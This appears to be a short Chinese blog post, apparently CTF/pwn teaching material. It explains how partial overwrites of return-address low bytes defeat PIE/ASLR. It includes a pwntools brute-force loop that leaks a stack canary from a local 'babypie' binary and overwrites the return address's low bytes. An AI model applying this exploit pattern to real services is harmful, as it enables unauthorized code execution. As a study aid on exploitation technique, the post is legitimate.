# 部分写固定思路


我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。

正常情况我们不能写入12位，只能写入16位，因此我们只能猜测最后4位（一个16进制位）的数值，然后循环碰撞即可。

```python
while True:
    try:
        io = process("./babypie", timeout = 1)

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        io.interactive()
    except Exception as e:
        io.close()
        print e
```

注意：`gets()`、`printf()`等字符串输入函数会在输入末尾加上`\x00`导致部分写失败。部分写只在`read()`上使用。



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/11/partial_overwrite/  

